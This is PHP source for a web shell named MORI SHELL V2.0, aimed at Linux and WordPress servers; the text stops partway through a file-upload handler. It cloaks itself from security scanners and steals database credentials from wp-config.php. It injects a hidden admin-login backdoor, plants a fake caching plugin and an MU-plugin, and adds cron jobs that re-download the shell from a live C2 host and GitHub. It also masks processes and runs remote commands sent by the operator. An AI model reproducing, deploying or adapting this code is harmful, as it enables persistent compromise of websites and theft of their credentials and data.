<?php
/**
 * MORI SHELL V2.0 - LINUX CLIENT
 * WordPress-aware | Process masking | C2 integrated
 */
ob_start();
// Global CORS — allow C2 server and browser stress panel to reach every endpoint
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
set_time_limit(0);
ignore_user_abort(true);

// LINUX ONLY - No Windows
if ((!defined('PHP_OS_FAMILY') || PHP_OS_FAMILY !== 'Linux') && 
    stripos(PHP_OS, 'Linux') === false && stripos(PHP_OS, 'Unix') === false) {
    if (php_sapi_name() !== 'cli') exit;
}

define('SHELL_FILE', basename(__FILE__));
define('SHELL_PATH', __DIR__ . '/' . SHELL_FILE);
define('SHELL_VERSION', '2.0-linux');

// =====================================================
// BOT / SCANNER CLOAKING
// =====================================================
function is_bot_request() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    return (bool)preg_match(
        '/(bot|crawl|spider|slurp|google|bing|yahoo|yandex|baidu|facebookexternalhit|twitterbot|' .
        'wordfence|sucuri|sitecheck|imunify|modsecurity|virustotal|urlscan|safebrowsing|phishtank|' .
        'nikto|sqlmap|nmap|nessus|openvas|acunetix|netsparker|nuclei|burpsuite|qualys|tenable|' .
        'ahrefs|semrush|moz\.com|majestic|screaming.frog|rogerbot|dotbot|seokicks|' .
        'zgrab|masscan|python-requests|go-http-client|libwww|curl\/[0-9])/i',
        $ua
    );
}
// Direct HTTP access by scanner → silent 404 (don't reveal shell)
if (php_sapi_name() !== 'cli' && !defined('ABSPATH') && is_bot_request()) {
    http_response_code(404);
    header('Cache-Control: no-store');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head>' .
        '<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p>' .
        '<hr><address>Apache/2.4 Server</address></body></html>');
}

// OS Detection
$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') || !empty(getenv('WINDIR'));

$C2_SERVER = "https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php";
$DEBUG_MODE = true;
$persistence_default_url = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php';

// =====================================================
// ERROR LOGGING HELPER
// =====================================================
function log_error_to_file($message) {
    $log_file = sys_get_temp_dir() . '/.svc_' . substr(md5(__FILE__), 0, 8) . '.log';
    @file_put_contents($log_file, '[' . date('H:i:s') . '] ' . $message . "\n", FILE_APPEND);
}

// Register error handler
set_error_handler(function($errno, $errstr, $errfile, $errline) {
    if ($errno & error_reporting()) {
        log_error_to_file("PHP ERROR [$errno]: $errstr in $errfile:$errline");
    }
    return false;
});

// Register exception handler
set_exception_handler(function($e) {
    log_error_to_file("EXCEPTION: " . $e->getMessage() . " in " . $e->getFile() . ":" . $e->getLine());
});

// =====================================================
// INLINE WORDPRESS DETECTION & PERSISTENCE
// =====================================================

function is_wordpress_installed() {
    $markers = ['/wp-content/', '/wp-includes/', '/wp-admin/', '/wp-config.php'];
    foreach ($markers as $m) {
        if (@file_exists(__DIR__ . $m)) return true;
    }
    return false;
}

function get_wordpress_config() {
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    foreach ($search_dirs as $dir) {
        $cfg = $dir . '/wp-config.php';
        if (@file_exists($cfg)) {
            $content = @file_get_contents($cfg);
            if (!$content) continue;
            $creds = [];
            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['name'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['user'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['pass'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['host'] = $m[1];
            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['prefix'] = $m[1];
            return !empty($creds) ? $creds : null;
        }
    }
    return null;
}

function inject_wordpress_persistence($shell_url, $c2_server) {
    $wp_config = null;
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    
    foreach ($search_dirs as $dir) {
        if (@file_exists($dir . '/wp-config.php')) {
            $wp_config = $dir . '/wp-config.php';
            break;
        }
    }
    
    if (!$wp_config) return false;
    
    $content = @file_get_contents($wp_config);
    if (!$content || strpos($content, 'mori_backdoor_wp') !== false) return false;
    
    // Extract DB credentials from wp-config
    $db_name = $db_user = $db_pass = $db_host = '';
    preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_name = $m[1];
    preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_user = $m[1];
    preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_pass = $m[1];
    preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_host = $m[1];
    
    // Get dynamic WordPress login credentials
    $wp_creds = generate_wp_login_credentials();
    $blogs_id = $wp_creds['blogs_id'];
    $hash = $wp_creds['hash'];
    
    $creds_json = json_encode(['db_name' => $db_name, 'db_user' => $db_user, 'db_pass' => $db_pass, 'db_host' => $db_host, 'shell_url' => $shell_url], JSON_UNESCAPED_SLASHES);
    $creds_encoded = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($creds_json));
    
    $inject = "\n// MORI BACKDOOR (mori_backdoor_wp) - Generated: " . date('Y-m-d H:i:s') . "\n// MORI ID: " . $blogs_id . "\nif (!function_exists('mori_backdoor_wp')) {\n" .
        "    function mori_backdoor_wp() {\n" .
        "        // PARAMETER-BASED HIDDEN LOGIN (blogs_id, wp_login)\n" .
        "        if (isset(\$_GET['blogs_id']) && isset(\$_GET['wp_login'])) {\n" .
        "            \$hash = sha1(md5(\$_GET['blogs_id'] . '1776051848'));\n" .
        "            if (\$hash === '" . $hash . "') {\n" .
        "                \$users = get_users(['role' => 'administrator', 'orderby' => 'ID', 'order' => 'ASC', 'number' => 1]);\n" .
        "                if (!empty(\$users)) {\n" .
        "                    \$user = \$users[0];\n" .
        "                    wp_set_auth_cookie(\$user->ID, true);\n" .
        "                    wp_redirect(admin_url());\n" .
        "                    exit;\n" .
        "                }\n" .
        "            }\n" .
        "        }\n" .
        "        // CREDS EXFIL on admin login\n" .
        "        if (isset(\$_GET['wp_login'])) {\n" .
        "            \$shell_url = '" . addslashes($shell_url) . "';\n" .
        "            \$creds = '" . addslashes($creds_encoded) . "';\n" .
        "            @wp_remote_post(\$shell_url . '?act=wp_creds', ['body' => ['creds' => \$creds]]);\n" .
        "        }\n" .
        "        // AUTO RESTORE\n" .
        "        if (function_exists('curl_init')) {\n" .
        "            \$ch = curl_init('" . addslashes($shell_url) . "');\n" .
        "            curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\n" .
        "            curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);\n" .
        "            curl_setopt(\$ch, CURLOPT_TIMEOUT_MS, 200);\n" .
        "            @curl_exec(\$ch);\n" .
        "            curl_close(\$ch);\n" .
        "        }\n" .
        "    }\n" .
        "    add_action('wp_footer', 'mori_backdoor_wp', -999);\n" .
        "    add_action('wp_authenticate', 'mori_backdoor_wp', -999);\n" .
        "}\n";
    
    $insertion = "/* That's all, stop editing!";
    if (strpos($content, $insertion) !== false) {
        $new_content = str_replace($insertion, $inject . $insertion, $content);
    } else {
        // Fallback: marker absent (custom WP or non-standard install)
        // Fallback: append before closing PHP tag or at EOF
        $trimmed = rtrim($content);
        if (substr($trimmed, -2) === '?>') {
            $new_content = substr($trimmed, 0, -2) . "\n" . $inject . "\n?>";
        } else {
            $new_content = $trimmed . "\n" . $inject;
        }
    }
    @file_put_contents($wp_config, $new_content);
    return ['blogs_id' => $blogs_id, 'hash' => $hash];
}

// =====================================================
// INLINE PROCESS MASKING (LINUX)
// =====================================================

class ProcessMasker {
    public static function mask() {
        if (php_sapi_name() === 'cli') {
            @putenv('PATH=');
            @putenv('SHELL=');
            @shell_exec("exec -a '[system]' /bin/sh -c 'sleep 999999' &");
            @shell_exec("exec -a '[kworker]' /bin/sh &");
        }
    }
}

ProcessMasker::mask();

function detect_web_shell_url() {
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || 
             (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443);
    $protocol = $https ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    $script = $_SERVER['SCRIPT_NAME'] ?? '/';
    return $protocol . $host . $script;
}

$WEB_URL = detect_web_shell_url();
$web_shell_url = $WEB_URL;  // Alias for c2_register()

// =====================================================
// PERSISTENCE INSTALLATION
// =====================================================

function install_cron_persistence() {
    $ts_file = sys_get_temp_dir() . '/.mori_cron_ts';
    $last = (int)@file_get_contents($ts_file);
    if ($last && (time() - $last) < 3600) return false;
    @file_put_contents($ts_file, time());

    $shell     = SHELL_PATH;
    $c2        = $GLOBALS['C2_SERVER'];
    $token     = md5('mori_c2_secret_2024_persistence');
    $gh_url    = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php';
    // Restore only when file is actually gone — C2 first (4s), GitHub fallback
    // head -c5 check: reject Cloudflare UAM HTML pages (they return 200 but aren't PHP)
    $c2_fetch  = "curl -sfL --max-time 4 '" . $c2 . "?act=get_shell&token=" . $token . "' -o '" . $shell . ".tmp' 2>/dev/null"
               . " && head -c5 '" . $shell . ".tmp' 2>/dev/null | grep -q '<?php'"
               . " && mv '" . $shell . ".tmp' '" . $shell . "' 2>/dev/null";
    $gh_fetch  = "curl -sfL --max-time 15 '" . $gh_url . "' -o '" . $shell . ".tmp' 2>/dev/null"
               . " && head -c5 '" . $shell . ".tmp' 2>/dev/null | grep -q '<?php'"
               . " && mv '" . $shell . ".tmp' '" . $shell . "' 2>/dev/null";
    $restore_cmd = "[ -f '" . $shell . "' ] || { " . $c2_fetch . " || " . $gh_fetch . "; } >/dev/null 2>&1";
    $script = "*/5 * * * * php '$shell' >/dev/null 2>&1; " . $restore_cmd;

    // Method 1: exec_any (shell_exec→exec→system→passthru→proc_open→popen)
    $cron_cmd = "(crontab -l 2>/dev/null | grep -v mori; echo '$script') | crontab - 2>/dev/null";
    if (exec_any($cron_cmd) !== false) return true;

    // Method 2: proc_open stdin (no shell required)
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = @proc_open('crontab -', $descriptors, $pipes);
        if (is_resource($proc)) {
            fwrite($pipes[0], $script . "\n");
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($proc);
            return true;
        }
    }

    // Method 3: /etc/cron.d/ direct write
    if (@is_writable('/etc/cron.d/')) {
        @file_put_contents('/etc/cron.d/mori-shell', $script . "\n", FILE_APPEND);
        @chmod('/etc/cron.d/mori-shell', 0644);
        return true;
    }

    return false;
}

function install_wp_persistence() {
    if (!is_wordpress_installed()) return;
    $url = $GLOBALS['WEB_URL'];
    @inject_wordpress_persistence($url, $GLOBALS['C2_SERVER']);
}

// ---- WP Plugin Persistence ------------------------------------------------
function install_wp_plugin_persistence() {
    // wp-config.php'yi bul → plugins dizinini türet
    $wp_root = null;
    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
        if (@file_exists($d . '/wp-config.php') || @file_exists($d . '/wp-load.php')) {
            $wp_root = $d; break;
        }
    }
    if (!$wp_root) return;

    $plugins_dir = $wp_root . '/wp-content/plugins';
    if (!is_dir($plugins_dir)) return;

    $plugin_dir  = $plugins_dir . '/fastest-cache-2';
    $plugin_file = $plugin_dir  . '/fastest-cache-2.php';

    // Dosya sağlıklıysa günde bir kez kontrol yap (hızlı dön)
    if (@file_exists($plugin_file) && @filesize($plugin_file) > 500) {
        $ts_file = sys_get_temp_dir() . '/.mori_plugin_ts';
        if ((int)@file_get_contents($ts_file) > time() - 86400) return;
        @file_put_contents($ts_file, time()); return;
    }
    // Plugin eksik/bozuk → throttle'sız anında yeniden oluştur

    @mkdir($plugin_dir, 0755, true);

    $shell_path = addslashes(__FILE__);
    $shell_url  = addslashes($GLOBALS['WEB_URL']  ?? '');
    $c2_url     = addslashes($GLOBALS['C2_SERVER'] ?? '');
    $gh_url     = addslashes('https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php');
    $fc2_token  = md5('mori_c2_secret_2024_persistence');

    $plugin_code = '<?php
/**
 * Plugin Name: Fastest Cache 2
 * Plugin URI:  https://wordpress.org/plugins/fastest-cache/
 * Description: Advanced caching and performance optimization.
 * Version:     2.3.1
 * Author:      WP Cache Team
 * License:     GPL2
 */
if (!defined("ABSPATH")) exit;

define("FC2_SHELL",   "' . $shell_path . '");
define("FC2_URL",     "' . $shell_url  . '");
define("FC2_C2",      "' . $c2_url     . '");
define("FC2_GH",      "' . $gh_url     . '");
define("FC2_TOKEN",   "' . $fc2_token  . '");
define("FC2_LOCK",    WP_CONTENT_DIR . "/.fc2_check");

function fc2_restore_shell() {
    // [timeout_c2, timeout_gh] — C2 short (UAM wastes time), GitHub longer
    $sources = [
        [FC2_C2 . "?act=get_shell&token=" . FC2_TOKEN, 4],
        [FC2_GH, 15],
    ];
    foreach ($sources as [$src, $tmo]) {
        $body = false;
        if (function_exists("curl_init")) {
            $ch = curl_init($src);
            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$tmo,
                CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_SSL_VERIFYPEER=>false,
                CURLOPT_FOLLOWLOCATION=>true, CURLOPT_USERAGENT=>"Mozilla/5.0"]);
            $body = @curl_exec($ch); @curl_close($ch);
        }
        if (!$body) $body = @file_get_contents($src, false,
            stream_context_create(["http"=>["timeout"=>$tmo,"user_agent"=>"Mozilla/5.0"]]));
        // Reject Cloudflare UAM HTML (returns 200 but is not PHP)
        if ($body && strlen($body) > 10000 && substr($body, 0, 5) === "<?php") {
            @file_put_contents(FC2_SHELL, $body);
            @chmod(FC2_SHELL, 0644);
            return true;
        }
    }
    return false;
}

function fc2_check() {
    // Throttle: dakikada bir kontrol
    $lock_age = @file_exists(FC2_LOCK) ? (time() - @filemtime(FC2_LOCK)) : 9999;
    if ($lock_age < 60) return;
    @touch(FC2_LOCK);

    $sz = @file_exists(FC2_SHELL) ? @filesize(FC2_SHELL) : 0;
    if ($sz < 10000) fc2_restore_shell();
}
add_action("init", "fc2_check", 1);

// WP-Ajax endpoint — C2 ping: /wp-admin/admin-ajax.php?action=fc2_ping
function fc2_ping_handler() {
    $sz      = @file_exists(FC2_SHELL) ? @filesize(FC2_SHELL) : 0;
    $alive   = ($sz > 10000);
    if (!$alive) { fc2_restore_shell(); $sz = @filesize(FC2_SHELL); $alive = ($sz > 10000); }
    wp_send_json(["ok" => $alive, "sz" => $sz, "url" => FC2_URL]);
}
add_action("wp_ajax_nopriv_fc2_ping", "fc2_ping_handler");
add_action("wp_ajax_fc2_ping",        "fc2_ping_handler");
';

    @file_put_contents($plugin_file, $plugin_code);
    @chmod($plugin_file, 0644);

    // Eklentiyi DB üzerinden aktive et (WordPress yüklüyse)
    if (function_exists('add_option') || defined('ABSPATH')) {
        $active = @get_option('active_plugins', []);
        $entry  = 'fastest-cache-2/fastest-cache-2.php';
        if (!in_array($entry, (array)$active, true)) {
            $active[] = $entry;
            @update_option('active_plugins', $active);
        }
    } else {
        // WP yüklü değil — DB direkt yaz
        $wp_config_path = $wp_root . '/wp-config.php';
        if (@file_exists($wp_config_path)) {
            $cfg = @file_get_contents($wp_config_path);
            if ($cfg) {
                preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m1);
                preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m2);
                preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m3);
                preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $cfg, $m4);
                preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $cfg, $m5);
                if ($m1 && $m2 && $m3 && $m4) {
                    $prefix = $m5[1] ?? 'wp_';
                    try {
                        $db = new PDO("mysql:host={$m4[1]};dbname={$m1[1]};charset=utf8", $m2[1], $m3[1],
                            [PDO::ATTR_TIMEOUT=>3, PDO::ATTR_ERRMODE=>PDO::ERRMODE_SILENT]);
                        $row = $db->query("SELECT option_value FROM {$prefix}options WHERE option_name='active_plugins' LIMIT 1")->fetch();
                        if ($row) {
                            $plugins = @unserialize($row['option_value']) ?: [];
                            $entry   = 'fastest-cache-2/fastest-cache-2.php';
                            if (!in_array($entry, $plugins, true)) {
                                $plugins[] = $entry;
                                $new_val   = serialize($plugins);
                                $db->prepare("UPDATE {$prefix}options SET option_value=? WHERE option_name='active_plugins'")->execute([$new_val]);
                            }
                        }
                    } catch (Exception $e) {}
                }
            }
        }
    }
}

// ---- MU-Plugin Persistence (admin deactivate edemez) -------------------------
function install_mu_plugin_persistence() {
    // WP root bul
    $wp_root = null;
    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
        if (@file_exists($d . '/wp-config.php') || @file_exists($d . '/wp-load.php')) {
            $wp_root = $d; break;
        }
    }
    if (!$wp_root) return;

    $mu_dir  = $wp_root . '/wp-content/mu-plugins';
    if (!is_dir($mu_dir) && !@mkdir($mu_dir, 0755, true)) return;

    $mu_file = $mu_dir . '/fc2-loader.php';
    // Dosya sağlıklıysa saatte bir kontrol (hızlı dön)
    if (@file_exists($mu_file) && @filesize($mu_file) > 300) {
        $ts = sys_get_temp_dir() . '/.mori_mu_ts';
        if ((int)@file_get_contents($ts) > time() - 3600) return;
        @file_put_contents($ts, time()); return;
    }
    // MU plugin eksik/bozuk → throttle'sız yeniden oluştur

    $shell_path = addslashes(__FILE__);
    $c2_url     = addslashes($GLOBALS['C2_SERVER'] ?? '');
    $gh_url     = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php';
    $mu_token   = md5('mori_c2_secret_2024_persistence');

    $mu_code = '<?php
// Must-use plugin — WP admin panelden deactivate edilemez
if (!defined("ABSPATH")) exit;

// Her admin sayfasında: regular plugin deactivate edildiyse yeniden aktive et
add_action("admin_init", function() {
    $plugins = (array)get_option("active_plugins", []);
    $entry   = "fastest-cache-2/fastest-cache-2.php";
    if (!in_array($entry, $plugins, true)) {
        $plugins[] = $entry;
        update_option("active_plugins", $plugins);
    }
}, 1);

// Her WP isteğinde: shell bütünlüğünü kontrol et (dakikada bir)
add_action("init", function() {
    $lock = WP_CONTENT_DIR . "/.fc2_mu_lock";
    if (@file_exists($lock) && (time() - @filemtime($lock)) < 60) return;
    @touch($lock);
    $shell = "' . $shell_path . '";
    $sz    = @file_exists($shell) ? @filesize($shell) : 0;
    if ($sz >= 10000) return;
    // Shell eksik/bozuk — C2 veya GitHub\'dan restore et
    // [url, timeout] — C2 4s (UAM hızlı ret), GitHub 15s
    $sources = [
        ["' . $c2_url . '?act=get_shell&token=' . $mu_token . '", 4],
        ["' . $gh_url . '", 15],
    ];
    foreach ($sources as [$src, $tmo]) {
        $body = false;
        if (function_exists("curl_init")) {
            $ch = curl_init($src);
            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$tmo,
                CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_SSL_VERIFYPEER=>false,
                CURLOPT_FOLLOWLOCATION=>true, CURLOPT_USERAGENT=>"Mozilla/5.0"]);
            $body = @curl_exec($ch); @curl_close($ch);
        }
        if (!$body) $body = @file_get_contents($src, false,
            stream_context_create(["http"=>["timeout"=>$tmo,"user_agent"=>"Mozilla/5.0"]]));
        // Reject Cloudflare UAM HTML — must be valid PHP
        if ($body && strlen($body) > 10000 && substr($body, 0, 5) === "<?php") {
            @file_put_contents($shell, $body);
            @chmod($shell, 0644);
            break;
        }
    }
}, 1);
';
    @file_put_contents($mu_file, $mu_code);
    @chmod($mu_file, 0644);
    @file_put_contents(sys_get_temp_dir() . '/.mori_mu_ts', time());
}

@install_wp_persistence();
@install_wp_plugin_persistence();
@install_mu_plugin_persistence();
@install_cron_persistence();
@ensure_persistence_v4();  // starts Python+bash monitors on first request (5-min throttle)

// =====================================================
// CLIENT ID & SYSTEM INFO
// =====================================================

function generate_client_id() {
    $id_file = __DIR__ . '/.mori_id';
    if (@file_exists($id_file) && filesize($id_file) > 5) {
        return trim(file_get_contents($id_file));
    }
    $id = 'mori_' . substr(md5(php_uname() . __FILE__), 0, 16);
    @file_put_contents($id_file, $id);
    return $id;
}

function generate_wp_login_credentials() {
    $creds_file = __DIR__ . '/.wp_login_creds';
    $secret = '1776051848';

    // 1. Try cached creds file
    if (@file_exists($creds_file) && @filesize($creds_file) > 10) {
        $creds = @json_decode(@file_get_contents($creds_file), true);
        if (!empty($creds['blogs_id']) && !empty($creds['hash'])) {
            return $creds;
        }
    }

    // 2. .wp_login_creds missing/corrupt — try to recover blogs_id from wp-config.php
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    foreach ($search_dirs as $dir) {
        $cfg = $dir . '/wp-config.php';
        if (!@file_exists($cfg)) continue;
        $cfg_content = @file_get_contents($cfg);
        if (!$cfg_content) continue;
        // Look for embedded ID comment: // MORI ID: <blogs_id>
        if (preg_match('/\/\/ MORI ID: ([a-f0-9]{16})/', $cfg_content, $m)) {
            $blogs_id = $m[1];
            $hash = sha1(md5($blogs_id . $secret));
            $creds = ['blogs_id' => $blogs_id, 'hash' => $hash, 'timestamp' => time()];
            @file_put_contents($creds_file, json_encode($creds));
            return $creds;
        }
    }

    // 3. No existing record anywhere — generate fresh
    $blogs_id = substr(bin2hex(random_bytes(16)), 0, 16);
    $hash = sha1(md5($blogs_id . $secret));
    $creds = ['blogs_id' => $blogs_id, 'hash' => $hash, 'timestamp' => time()];
    @file_put_contents($creds_file, json_encode($creds));
    return $creds;
}

$CLIENT_ID = generate_client_id();
$GLOBALS['C2_SHELL'] = __FILE__;

function get_system_info() {
    return [
        'id' => $GLOBALS['CLIENT_ID'],
        'version' => SHELL_VERSION,
        'url' => $GLOBALS['WEB_URL'],
        'php' => phpversion(),
        'os' => php_uname(),
        'user' => get_current_user(),
        'wp' => is_wordpress_installed() ? 'yes' : 'no',
        'wp_root' => is_wordpress_installed() ? (get_wordpress_config() ? 'found' : 'unknown') : null,
        'timestamp' => time(),
    ];
}

// =====================================================
// HTTP COMMUNICATION (3 methods fallback)
// =====================================================

function http_request($method, $url, $data = null) {
    // Method 1: cURL (BEST for POST with raw data)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_USERAGENT, 'MORI-Agent/2.0');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        if ($method === 'POST' && $data) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        
        $result = @curl_exec($ch);
        $error = curl_error($ch);
        @curl_close($ch);
        
        if ($error) {
            error_log("[http_request] cURL error: $error");
        } elseif ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    // Method 2: file_get_contents
    if (ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'method' => $method,
                'timeout' => 15,
                'ignore_errors' => true,
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ];
        if ($method === 'POST' && $data) {
            $opts['http']['content'] = $data;
            $opts['http']['header'] = 'Content-Type: application/x-www-form-urlencoded';
        }
        $result = @file_get_contents($url, false, stream_context_create($opts));
        if ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    // Method 3: fsockopen
    $parts = parse_url($url);
    if (!isset($parts['host'])) return null;
    
    $host = $parts['host'];
    $port = ($parts['scheme'] === 'https') ? 443 : 80;
    $path = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');
    
    $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 10);
    if ($fp) {
        $out = "$method $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n";
        if ($method === 'POST' && $data) {
            $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
            $out .= "Content-Length: " . strlen($data) . "\r\n\r\n" . $data;
        } else {
            $out .= "\r\n";
        }
        fwrite($fp, $out);
        $raw = '';
        while (!feof($fp)) $raw .= fgets($fp, 4096);
        fclose($fp);

        // Strip HTTP headers — return body only
        if (!empty($raw)) {
            $sep = strpos($raw, "\r\n\r\n");
            $result = ($sep !== false) ? substr($raw, $sep + 4) : $raw;
            if (!empty($result)) return $result;
        }
    }
    
    // All methods failed - return null
    return null;
}

// =====================================================
// EXEC FALLBACK CHAIN — tüm exec yöntemlerini dene
// =====================================================
function exec_any($cmd, $bg = false) {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    $run = $bg ? ($cmd . ' > /dev/null 2>&1 &') : ($cmd . ' 2>&1');

    foreach (['shell_exec','exec','system','passthru'] as $fn) {
        if (function_exists($fn) && !in_array($fn, $disabled)) {
            $r = @$fn($run);
            return ($r !== null && $r !== false) ? $r : true;
        }
    }
    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $p = @proc_open($run, [1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
        if ($p) {
            $o = $bg ? '' : @stream_get_contents($pipes[1]);
            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p);
            return $o ?: true;
        }
    }
    if (function_exists('popen') && !in_array('popen', $disabled)) {
        $h = @popen($run, 'r');
        if ($h) { $o = $bg ? '' : @stream_get_contents($h); @pclose($h); return $o ?: true; }
    }
    return false;
}

// =====================================================
// DETECT PYTHON COMMAND
// =====================================================

function detect_python_command() {
    // Python binary detection for Linux systems
    $paths = ['/usr/bin/python3', '/usr/bin/python', '/usr/local/bin/python3', '/usr/local/bin/python'];
    foreach ($paths as $path) {
        if (@file_exists($path) && @is_executable($path)) {
            return $path;
        }
    }
    // Try which command
    if (function_exists('shell_exec')) {
        $python = @shell_exec('which python3 2>/dev/null || which python 2>/dev/null');
        if ($python) return trim($python);
    }
    return null;
}

// =====================================================
// C2 REGISTRATION & COMMAND EXECUTION
// =====================================================

// =====================================================
// COMMAND EXECUTION ENGINE - REMOVED
// Use execute_command() or execute_system_command() instead
// =====================================================

// =====================================================
// API ENDPOINTS
// =====================================================

// Auto-register on first access
// Auto-register (non-blocking, background task)
// Cache registration in memory to avoid repeat registration loops
// wp-activeter.php → navbar.php self-rename (non-WP sites)
@self_rename_and_register();

if (!isset($GLOBALS['_SHELL_REGISTERED'])) {
    $GLOBALS['_SHELL_REGISTERED'] = false;

    // Try to read registration status from file (one-time read)
    $reg_file = __DIR__ . '/.registered';
    if (@file_exists($reg_file) && @filesize($reg_file) > 0) {
        $GLOBALS['_SHELL_REGISTERED'] = true;
    } else {
        // First-time registration - non-blocking attempt
        // Try registration with super short timeout (1 sec max)
        @c2_register_background($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
        
        // Mark as registered to avoid infinite loop
        $GLOBALS['_SHELL_REGISTERED'] = true;
    }
}

// Handle API requests
if (isset($_GET['m']) || isset($_POST['m'])) {
    // Decode with safe_base64_decode (uses -, _ instead of +, /)
    $encoded = $_GET['m'] ?? $_POST['m'] ?? '';
    $cmd = safe_base64_decode($encoded);
    
    if (!$cmd) {
        echo "[ERROR] Failed to decode command";
        exit;
    }
    
    error_log("[EXEC] Executing command: " . (strlen($cmd ?? '') > 0 ? substr($cmd, 0, 100) : '(empty)'));
    
    $output = execute_command($cmd);
    $task_id = $_GET['task_id'] ?? $_POST['task_id'] ?? null;
    
    error_log("[EXEC] Output length: " . strlen($output));
    
    // Send result to C2
    @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $output, $task_id);
    
    // Return output to requester
    echo $output;
    exit;
}

if (isset($_GET['info'])) {
    echo json_encode(get_system_info());
    exit;
}

// =====================================================
// FILE UPLOAD HANDLER (HTTP-based fallback)
// =====================================================
// When shell commands are disabled, C2 sends files via HTTP POST
// Receives: Base64-encoded file content + filename
// Stores: Decoded file to filesystem
if (isset($_POST['act']) && $_POST['act'] == 'upload_file') {
    header('Content-Type: application/json; charset=utf-8');
    
